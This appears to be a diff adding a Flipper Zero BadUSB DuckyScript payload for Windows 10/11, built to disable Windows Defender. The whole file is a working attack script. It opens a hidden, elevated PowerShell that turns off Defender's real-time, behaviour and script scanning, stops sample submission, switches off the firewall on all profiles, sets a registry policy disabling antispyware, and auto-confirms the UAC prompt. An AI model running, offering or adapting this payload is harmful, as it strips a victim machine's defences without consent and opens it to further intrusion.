@@ -1,0 +1,18 @@
+﻿REM ============================================================================
+REM  FLLC - BadUSB: Disable Windows Defender
+REM  Flipper Zero DuckyScript
+REM ============================================================================
+REM  Target: Windows 10/11
+REM  Time: ~8 seconds
+REM  Disables real-time protection, firewall, and tamper protection bypass
+REM  Requires UAC elevation
+REM ============================================================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -MAPSReporting 0; Set-MpPreference -SubmitSamplesConsent 2; netsh advfirewall set allprofiles state off; reg add \\\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f\"' -Verb RunAs"
+ENTER
+DELAY 1500
+ALT y
+DELAY 500
